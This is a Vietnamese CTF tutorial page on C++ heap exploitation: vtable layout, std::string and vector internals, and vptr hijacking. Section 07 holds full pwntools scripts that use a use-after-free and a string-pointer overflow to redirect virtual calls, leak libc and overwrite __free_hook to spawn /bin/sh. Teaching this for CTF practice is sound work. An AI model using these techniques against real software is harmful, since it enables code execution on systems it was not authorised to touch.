@@ -1,0 +1,508 @@
+<title>C++ Pwn</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,46px);line-height:1.03;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.vtbox{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0;font-family:var(--font-mono);font-size:12.5px}
+.vtbox .cells{display:flex;flex-direction:column;gap:4px;margin:10px 0}
+.vtbox .c{display:grid;grid-template-columns:150px 1fr;gap:8px;border:1px solid var(--line);border-radius:6px;padding:6px 10px;background:var(--surface)}
+.vtbox .c.vptr{border-left:3px solid var(--accent)}
+.vtbox .c.hit{background:var(--accent-soft);border-color:var(--accent);font-weight:700}
+.vtbox .a{color:var(--mem)}
+.vtbox button{font-family:var(--font-mono);font-size:12px;padding:6px 12px;border:1px solid var(--line);border-radius:7px;background:var(--surface);color:var(--fg);cursor:pointer;margin-top:4px}
+.vtbox .msg{margin-top:8px;color:var(--mem)}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 5 · C++</div>
+    <h1>C++ Pwn</h1>
+    <p class="sub">Binary C++ khác C: đối tượng có <strong>con trỏ vtable</strong> (bảng hàm ảo) ở đầu; gọi hàm ảo = <mark>đọc vtable rồi call</mark>. UAF/overflow trên đối tượng → <strong>ghi đè vptr</strong> → điều khiển call ảo = chiếm RIP. Bài này: layout đối tượng, std::string/vector internals, vtable hijack với số thật.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Cao (Phase 5)</span>
+      <span class="chip"><b>Binary mẫu:</b> g++ x86-64</span>
+      <span class="chip"><b>Cần trước:</b> <a href="heap_bugs.html" style="color:inherit">UAF</a> · <a href="rop_basics.html" style="color:inherit">ROP</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~60 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Layout vtable</a><a href="#s4">04 STL internals</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>vtable:</strong> đối tượng có hàm ảo (<code>virtual</code>) chứa <em>vptr</em> (con trỏ vtable) ở offset 0. Gọi <code>obj-&gt;f()</code> = <code>(*(vptr+idx))()</code> — đọc địa chỉ hàm từ bảng rồi call.</p>
+    <p><strong>Pwn:</strong> nếu ghi đè được vptr (qua UAF/overflow trên đối tượng), bạn trỏ vptr tới bảng giả → call ảo nhảy tới địa chỉ bạn chọn = chiếm RIP (<code>rdi</code> = this, tiện cho system).</p>
+    <p><strong>STL:</strong> <code>std::string</code>/<code>vector</code> có con trỏ data + size + cap trên heap → overflow/UAF đọc-ghi tùy ý.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>Ghi đè vptr → gọi hàm ảo nhảy vào bảng giả → RIP (rdi=this).</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Nhận dạng C++</span>
+<pre><code>strings → _ZN.../std::__cxx11::string; operator new/delete
+đối tượng đầu = vptr (trỏ .rodata vtable); gọi qua [vptr+off]</code></pre></div>
+      <div class="combat-row"><span class="lab">🧱 Layout đối tượng</span>
+<pre><code>obj+0x00: vptr → vtable (mảng con trỏ hàm ảo)
+obj+0x08: field1 ...   ; vtable[0]=~dtor vtable[1]=f() ...</code></pre></div>
+      <div class="combat-row"><span class="lab">🎯 vtable hijack (UAF)</span>
+<pre><code># free(obj); malloc cùng size, ghi: fake_vptr | ...
+# gọi obj->f() → *(fake_vptr+off)() , rdi=obj
+# đặt fake_vptr trỏ nơi bạn kiểm soát chứa &system; obj bắt đầu "/bin/sh"</code></pre></div>
+      <div class="combat-row"><span class="lab">🧵 std::string</span>
+        <p>SSO: chuỗi ≤15 ký tự nằm inline; dài hơn → con trỏ heap tại <code>str+0</code> + size <code>+8</code> + cap <code>+0x10</code>. Overflow string → đổi con trỏ data = ghi/đọc tùy ý.</p></div>
+      <div class="combat-row"><span class="lab">⚠️ Nhớ</span>
+        <p>rdi = this khi gọi hàm ảo → tiện <code>system(this)</code> nếu đầu obj = "/bin/sh". vtable ở .rodata (chỉ đọc) nhưng vptr trong obj (heap) ghi được. g++ mangle tên (_ZN...).</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Hàm ảo = gọi gián tiếp qua bảng</h2>
+  <p>C++ cho phép <code>virtual</code>: hàm được chọn lúc chạy theo kiểu thực của đối tượng. Trình biên dịch cài: mỗi lớp có hàm ảo tạo một <span class="mem-term">vtable</span> (mảng con trỏ hàm) đặt trong <code>.rodata</code>; mỗi đối tượng chứa <span class="mem-term">vptr</span> (con trỏ tới vtable) ở <strong>offset 0</strong>. Gọi <code>obj-&gt;draw()</code> dịch thành: đọc <code>vptr = *obj</code>, đọc <code>fn = *(vptr + idx*8)</code>, <code>call fn</code> với <code>rdi = obj</code>. Chính <em>lớp gián tiếp</em> này là bề mặt tấn công: kiểm soát vptr = kiểm soát call.</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">vtable</div><p>Mảng con trỏ hàm ảo (.rodata).</p></div>
+    <div class="card"><div class="term">vptr</div><p>Con trỏ tới vtable, ở obj+0.</p></div>
+    <div class="card"><div class="term">this</div><p>Con trỏ đối tượng = rdi.</p></div>
+    <div class="card"><div class="term">SSO</div><p>Small String Opt: chuỗi ngắn inline.</p></div>
+    <div class="card"><div class="term">name mangling</div><p>_ZN... tên hàm C++ mã hoá.</p></div>
+    <div class="card"><div class="term">RTTI</div><p>Thông tin kiểu lúc chạy (cạnh vtable).</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>vptr là GOT của C++</h2>
+  <p>Trong C, ghi đè GOT đổi hàm được gọi. Trong C++, <strong>vptr đóng vai tương tự</strong> nhưng nằm ngay trong đối tượng trên heap — dễ chạm hơn GOT (thường Full RELRO). Một UAF (<code>delete obj</code> rồi vẫn dùng), hay heap overflow sang đối tượng kế, cho phép ghi đè vptr. Lần gọi hàm ảo tiếp theo đọc vptr đã bị đầu độc → nhảy tới bảng giả → RIP. Vì <code>rdi</code> luôn = <code>this</code>, nếu đầu đối tượng chứa <code>"/bin/sh"</code> thì nhảy tới <code>system</code> là có shell ngay. Đó là lý do đề heap C++ (menu tạo/xoá/gọi đối tượng) rất phổ biến.</p>
+ </div>
+</section>
+
+<!-- 03 Layout -->
+<section class="block" id="s3">
+ <div class="wrap wide">
+  <div class="secnum">03 / LAYOUT VTABLE · MỤC LÕI</div>
+  <h2>Đối tượng, vtable, lời gọi ảo (số thật)</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 580 170" role="img" aria-label="đối tượng chứa vptr trỏ vtable; vtable chứa con trỏ hàm; call đọc qua 2 lần dereference" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <g font-family="monospace" font-size="10">
+    <text x="60" y="20" text-anchor="middle" fill="currentColor" stroke="none" opacity=".7">obj (heap 0x4052a0)</text>
+    <rect x="15" y="26" width="110" height="24" rx="4" stroke-width="1.6" stroke="#e8663e"/><text x="70" y="42" text-anchor="middle" fill="#e8663e" stroke="none">+0: vptr</text>
+    <rect x="15" y="50" width="110" height="22" rx="4" stroke-width="1.2"/><text x="70" y="65" text-anchor="middle" fill="currentColor" stroke="none">+8: data...</text>
+    <text x="300" y="20" text-anchor="middle" fill="currentColor" stroke="none" opacity=".7">vtable (.rodata 0x403d20)</text>
+    <rect x="245" y="26" width="130" height="22" rx="4" stroke-width="1.3"/><text x="310" y="41" text-anchor="middle" fill="currentColor" stroke="none">[0] ~dtor</text>
+    <rect x="245" y="48" width="130" height="22" rx="4" stroke-width="1.6" stroke="var(--mem)"/><text x="310" y="63" text-anchor="middle" fill="var(--mem)" stroke="none">[1] draw → 0x401350</text>
+    <path d="M125,38 L243,55" stroke="#e8663e" stroke-width="1.4" marker-end="url(#ao)"/>
+    <rect x="430" y="48" width="130" height="22" rx="4" stroke-width="1.5" stroke="#2f7d4f"/><text x="495" y="63" text-anchor="middle" fill="#2f7d4f" stroke="none">draw() code</text>
+    <path d="M375,59 L428,59" stroke="var(--mem)" stroke-width="1.3" marker-end="url(#am)"/>
+    <text x="290" y="150" text-anchor="middle" fill="currentColor" stroke="none" opacity=".72">call obj->draw(): rax=*obj(vptr); rax=*(rax+8); call rax; rdi=obj. 2 lần deref.</text>
+    </g>
+    <defs>
+    <marker id="ao" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#e8663e" stroke="none"/></marker>
+    <marker id="am" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="var(--mem)" stroke="none"/></marker>
+    </defs>
+  </svg>
+  <figcaption>obj+0=vptr → vtable → [idx]=hàm. Gọi ảo = 2 lần dereference. rdi=this.</figcaption>
+  </figure>
+  <h3>Byte-table đối tượng &amp; bảng giả</h3>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Địa chỉ</th><th>Nội dung</th><th>Ý nghĩa</th></tr></thead>
+    <tbody>
+      <tr><td><code>obj+0x00</code></td><td><code>0x403d20</code></td><td>vptr → vtable thật</td></tr>
+      <tr><td><code>obj+0x08</code></td><td>data lớp</td><td>field</td></tr>
+      <tr><td colspan="3" style="opacity:.6">— sau khi hijack (ghi đè vptr = obj+0x08) —</td></tr>
+      <tr><td><code>obj+0x00</code></td><td><code>obj+0x08</code></td><td>vptr GIẢ trỏ ngay vào obj</td></tr>
+      <tr><td><code>obj+0x08</code></td><td><code>&amp;system</code></td><td>vtable giả[0] = system</td></tr>
+      <tr><td><code>obj+0x10</code></td><td><code>"/bin/sh"</code>?</td><td>nếu rdi=obj... (xem bên dưới)</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">Mẹo rdi=this</span>Khi gọi hàm ảo, <code>rdi = obj</code> (con trỏ this). Nếu bạn làm vptr giả trỏ sao cho vtable_entry = <code>system</code>, thì <code>system(obj)</code> chạy — đặt <code>"/bin/sh"</code> ở ĐẦU obj (nhưng đầu obj là vptr...). Giải: trỏ vptr tới vùng khác chứa system, và để chuỗi "/bin/sh;" chèn khéo, hoặc dùng one_gadget (khỏi lo rdi).</div>
+ </div>
+</section>
+
+<!-- 04 STL -->
+<section class="block" id="s4">
+ <div class="wrap wide">
+  <div class="secnum">04 / STL INTERNALS</div>
+  <h2>std::string &amp; std::vector (số thật)</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>std::string (libstdc++)</th><th>offset</th><th>vector&lt;T&gt;</th><th>offset</th></tr></thead>
+    <tbody>
+      <tr><td>con trỏ data (_M_p)</td><td><code>+0x00</code></td><td>_M_start (begin)</td><td><code>+0x00</code></td></tr>
+      <tr><td>size (_M_string_length)</td><td><code>+0x08</code></td><td>_M_finish (end)</td><td><code>+0x08</code></td></tr>
+      <tr><td>cap / SSO buffer (16B)</td><td><code>+0x10</code></td><td>_M_end_of_storage (cap)</td><td><code>+0x10</code></td></tr>
+    </tbody>
+  </table></div>
+  <div class="note tip"><span class="tag">SSO</span><code>std::string</code> ≤15 ký tự lưu <em>inline</em> trong 16 byte tại <code>+0x10</code> (<code>_M_p</code> trỏ vào chính nó). Chuỗi dài hơn → <code>_M_p</code> trỏ buffer heap riêng. Overflow đổi <code>_M_p</code> = con trỏ đọc/ghi tùy ý (in string → leak địa chỉ đó; sửa string → ghi đó).</div>
+  <p><code>std::vector</code>: 3 con trỏ. Overflow đổi <code>_M_start</code> → <code>vec[i]</code> đọc/ghi địa chỉ tùy ý (giống OOB nhưng qua con trỏ). <code>size = (_M_finish − _M_start)/sizeof(T)</code>.</p>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Mô phỏng gọi hàm ảo</h2>
+  <p>Đối tượng tại 0x4052a0, vptr = 0x403d20 (vtable thật). Bấm "Hijack vptr" để đổi vptr → vùng attacker (bảng giả chứa &amp;system 0x7ffff7e52290). Xem call ảo nhảy đâu.</p>
+  <div class="lab">
+    <div class="vtbox" id="vb">
+      <div class="cells" id="vbCells"></div>
+      <button id="hijackBtn">Hijack vptr</button>
+      <button id="vbReset">Reset</button>
+      <div class="msg" id="vbMsg"></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>vtable, offset hàm ảo, bug</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Nhận C++ &amp; vtable</h4>
+    <pre><code><span class="p">$</span> strings bin | grep _ZN     <span class="c"># tên mangle → C++</span>
+<span class="c"># IDA: xref chuỗi vtable, địa chỉ .rodata</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Offset hàm ảo gọi</h4>
+    <pre><code><span class="c"># call qword [rax+8] → hàm ảo idx 1. Biết idx để đặt bảng giả.</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Bug trên đối tượng</h4>
+    <pre><code><span class="c"># UAF (dùng sau delete) / overflow sang obj kế / edit không kiểm</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>UAF vtable hijack (số thật, glibc 2.31)</h2>
+  <pre><code><span class="c">// game.cpp — g++ game.cpp -o game ; menu: new/delete/action(gọi hàm ảo)</span>
+<span class="k">class</span> Animal { <span class="k">public</span>: <span class="k">virtual void</span> speak(); <span class="k">char</span> name[<span class="d">24</span>]; };
+<span class="c">// new Animal → chunk 0x20; obj+0=vptr; action() gọi obj-&gt;speak()</span></code></pre>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · UAF hijack</button>
+    <button class="tab" data-t="b">B · string leak+write</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — UAF: delete obj rồi tạo "note" cùng size ghi đè vptr.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe = ELF(<span class="s">"./game"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+<span class="k">def</span> new_animal(name): p.sendlineafter(b<span class="s">"&gt;"</span>,b<span class="s">"1"</span>); p.sendline(name)
+<span class="k">def</span> delete():          p.sendlineafter(b<span class="s">"&gt;"</span>,b<span class="s">"2"</span>)
+<span class="k">def</span> action():          p.sendlineafter(b<span class="s">"&gt;"</span>,b<span class="s">"3"</span>)    <span class="c"># gọi speak()</span>
+<span class="k">def</span> new_note(data):    p.sendlineafter(b<span class="s">"&gt;"</span>,b<span class="s">"4"</span>); p.sendline(data)  <span class="c"># malloc cùng 0x20</span>
+
+<span class="c"># giả sử đã leak libc (qua UAF read vptr → tính base). base có rồi:</span>
+libc.address = <span class="d">0x7ffff7dc0000</span>            <span class="c"># ví dụ số thật sau leak</span>
+system = libc.sym.system                  <span class="c"># +0x52290 = 0x7ffff7e12290</span>
+
+<span class="c"># 1) tạo Animal, xoá (UAF), tái dùng chunk bằng note:</span>
+new_animal(b<span class="s">"AAAA"</span>)                       <span class="c"># obj tại 0x4052a0</span>
+delete()                                  <span class="c"># chunk vào tcache</span>
+<span class="c"># 2) ghi đè chunk: [fake_vptr=obj+8] [&amp;system] + "/bin/sh" khéo</span>
+<span class="c">#    đặt vtable giả NGAY trong obj: obj+8 = &amp;system ; vptr=obj+8-? </span>
+OBJ = <span class="d">0x4052a0</span>
+note  = p64(OBJ+<span class="d">0x8</span>)                    <span class="c"># +0: vptr giả trỏ obj+8 (bảng giả)</span>
+note += p64(system)                       <span class="c"># +8: vtable_giả[0] = system → speak() gọi system(this)</span>
+new_note(note)                            <span class="c"># chiếm lại chunk đã free</span>
+<span class="c"># this=obj nhưng đầu obj là con trỏ... dùng one_gadget an toàn hơn:</span>
+<span class="c"># note = p64(OBJ+8) + p64(libc.address+0xe3b01)  # one_gadget, khỏi lo rdi</span>
+action()                                  <span class="c"># gọi speak(): *(*(obj)+0)() = system/one_gadget</span>
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span>OBJ=0x4052a0, chunk 0x20, offset <code>system=0x52290</code>, one_gadget <code>0xe3b01</code> là glibc 2.31. Vì gọi ảo đặt rdi=this (đầu obj = con trỏ, không phải "/bin/sh"), <strong>one_gadget tiện hơn</strong> system. Cần leak libc trước (UAF đọc vptr cũ → trừ offset vtable). Idx hàm ảo (0 hay +8) đọc từ disasm <code>call [rax+?]</code>.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b">
+<pre><code><span class="c"># BẢN B — std::string overflow đổi _M_p → arbitrary read/write.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+p = process(<span class="s">"./app"</span>)
+<span class="c"># string layout: +0 _M_p(data) +8 size +0x10 cap/SSO</span>
+<span class="c"># overflow string trước đó → ghi đè _M_p của string kế = GOT/libc addr</span>
+
+<span class="c"># 1) leak: đổi _M_p = puts@got, in string → đọc puts thật</span>
+TARGET = <span class="d">0x404018</span>                       <span class="c"># puts@got</span>
+payload = b<span class="s">"A"</span>*<span class="d">0x20</span> + p64(TARGET) + p64(<span class="d">0x8</span>) + p64(<span class="d">0x1f</span>)  <span class="c"># _M_p,size,cap</span>
+p.sendlineafter(b<span class="s">"edit:"</span>, payload)
+p.sendlineafter(b<span class="s">"show:"</span>, b<span class="s">""</span>)
+leak = u64(p.recvline().strip().ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>))
+libc_base = leak - <span class="d">0x875a0</span>            <span class="c"># puts offset 2.31</span>
+
+<span class="c"># 2) write: đổi _M_p = __free_hook, sửa string = &amp;system → ghi hook</span>
+free_hook = libc_base + <span class="d">0x1eee48</span>
+payload = b<span class="s">"A"</span>*<span class="d">0x20</span> + p64(free_hook) + p64(<span class="d">0x8</span>) + p64(<span class="d">0x1f</span>)
+p.sendlineafter(b<span class="s">"edit:"</span>, payload)
+p.sendlineafter(b<span class="s">"set:"</span>, p64(libc_base+<span class="d">0x52290</span>))   <span class="c"># system</span>
+<span class="c"># rồi trigger free một string chứa "/bin/sh"</span>
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">string = con trỏ</span><code>std::string</code> thực chất là {data_ptr, size, cap}. Kiểm soát <code>_M_p</code> = đọc/ghi địa chỉ bất kỳ: in string leak, sửa string ghi. Mạnh như arbitrary R/W. Offset <code>puts=0x875a0, free_hook=0x1eee48, system=0x52290</code> glibc 2.31.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+exe=ELF(<span class="s">"./game"</span>,checksec=<span class="k">False</span>); libc=get_libc(<span class="s">"./libc.so.6"</span>); p=start()
+<span class="c"># leak vptr qua UAF → rebase</span>
+rebase_libc(leak=uaf_read_vptr(p), sym=<span class="s">"_vtable_Animal"</span>, off=<span class="d">0x...</span>)
+OBJ=<span class="d">0x4052a0</span>
+new_note(p, p64(OBJ+<span class="d">8</span>)+p64(LIBC.address+<span class="d">0xe3b01</span>))  <span class="c"># vptr giả + one_gadget</span>
+action(p); ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span><code>rebase_libc</code> từ leak vptr. Phần layout vtable/this là kiến thức bài này.</div>
+  </div>
+
+  <h3>Checklist</h3>
